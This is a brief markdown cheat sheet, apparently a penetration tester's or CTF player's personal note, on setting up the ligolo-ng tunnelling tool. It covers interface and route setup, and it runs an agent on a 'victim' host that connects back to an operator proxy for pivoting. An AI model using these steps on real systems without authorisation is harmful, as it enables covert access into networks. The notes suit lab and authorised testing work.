---
title: "ligolo-ng"
tags:
  - fetus
---
## installation:
```sh
apt install ligolo-ng -y
```
## configuration to replace tun0 with ligolo tap adapter:
```sh
sudo ip tuntap add user root mode tun ligolo
sudo ip route del 192.168.98.0/24 dev tun0
sudo ip link set ligolo up
sudo ip route add 192.168.98.0/24 dev ligolo
```
## usage:
- download the agent (and proxy if needed) binary from here after checking the victim architecture with `uname -m` from here: https://github.com/nicocha30/ligolo-ng/releases 
#### start proxy locally
```sh
./proxy -selfcert
```
#### start agent on victim
- transfer the agent binary to the victim
```sh
./agent -connect 10.10.200.85:11601 -ignore-cert
```
- should get a connection back at the proxy
#### do these inside the proxy: 
```sh
session
tunnel_list 
start
```
